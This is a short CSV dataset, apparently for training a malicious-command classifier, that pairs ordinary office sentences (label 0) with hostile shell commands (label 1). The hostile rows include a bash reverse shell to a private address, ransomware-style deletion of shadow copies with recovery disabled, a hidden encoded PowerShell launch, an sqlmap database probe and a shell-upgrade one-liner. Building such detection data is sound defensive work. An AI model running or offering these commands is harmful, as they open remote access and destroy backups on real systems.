Content,Label
"sqlmap -u 'http://testsite.com/login.php?id=1' --dbs --batch",1
"Can you please send me the report by EOD? Thanks!",0
"bash -i >& /dev/tcp/10.10.10.10/8080 0>&1",1
"The meeting has been rescheduled to tomorrow at 9 AM.",0
"vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No",1
"I am learning how to build a security system with Python.",0
"powershell -NoP -NonI -W Hidden -Enc JABjID0AbgBlAHcALQBvAGIAagBlAGMAdAA...",1
"Where can I find the documentation for the scikit-learn library?",0
"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",1
"git commit -m 'Fixed the bug in the data loader module'",0
